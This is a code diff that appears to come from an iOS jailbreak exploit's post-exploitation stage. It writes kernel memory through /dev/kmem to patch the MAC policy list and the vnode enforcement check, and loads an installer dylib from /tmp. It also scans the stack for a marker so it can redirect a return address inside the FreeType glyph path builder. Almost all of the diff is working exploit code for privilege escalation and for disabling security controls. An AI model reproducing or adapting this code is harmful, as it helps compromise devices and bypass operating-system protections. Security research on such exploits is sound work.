@@ -25,17 +25,27 @@
     long long expectedLength;
     const char *freeze;
     int freeze_len;
+    unsigned char *one;
+    unsigned int one_len;
 }
 @end
 
 static Dude *dude;
 
 @implementation Dude
+- (id)initWithOne:(unsigned char *)one_ oneLen:(int)one_len_ {
+    if(self = [super init]) {
+        one = one_;
+        one_len = one_len_;
+    }
+    return self;
+}
+
 static void unpatch() {
     int fd = open("/dev/kmem", O_RDWR);
     if(fd <= 0) goto fail;
-    unsigned int thing = CONFIG_PATCH_VNODE_ENFORCE_ORIG;
-    if(pwrite(fd, &thing, sizeof(thing), CONFIG_PATCH_VNODE_ENFORCE) != sizeof(thing)) goto fail;
+    unsigned int things[2] = {1, 2}; // original values of staticmax, maxindex
+    if(pwrite(fd, &things, sizeof(things), CONFIG_MAC_POLICY_LIST + 8) != sizeof(things)) goto fail;
     close(fd);
     return;
 fail:
@@ -54,9 +64,9 @@ static void set_progress(float progress) {
     NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
     void *handle = dlopen("/tmp/install.dylib", RTLD_LAZY);
     if(!handle) abort();
-    void (*do_install)(const char *, int, void (*)(float), unsigned int) = dlsym(handle, "do_install");
+    void (*do_install)(const char *, int, void (*)(float), unsigned int, unsigned char *, unsigned int) = dlsym(handle, "do_install");
 
-    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH);
+    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);
 
     NSLog(@"Um, I guess it worked.");
     unpatch();
@@ -182,9 +192,9 @@ void foo() {
     asm("");
 }
 
-void iui_go(io_connect_t port, unsigned char **ptr) {
+void iui_go(io_connect_t port, unsigned char **ptr, unsigned char *one, unsigned int one_len) {
     NSLog(@"iui_go: %d", (int) port);
-    dude = [[Dude alloc] init];
+    dude = [[Dude alloc] initWithOne:one oneLen:one_len];
     [dude performSelectorOnMainThread:@selector(startWithPort:) withObject:[NSNumber numberWithInt:(int)port] waitUntilDone:NO];
 
     // hmm.
@@ -198,7 +208,7 @@ void iui_go(io_connect_t port, unsigned char **ptr) {
     NSLog(@"addr = %p", addr);
     while(*--addr != 0xf00df00d);
     NSLog(@"foodfood found at %p", addr);
-    while(!(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + (CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1 ? 0x200 : 0x400))) addr++;
+    while(!(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400))) addr++;
     NSLog(@"Now we want to return to %p - 7", addr);
     foo();
     addr -= 7;
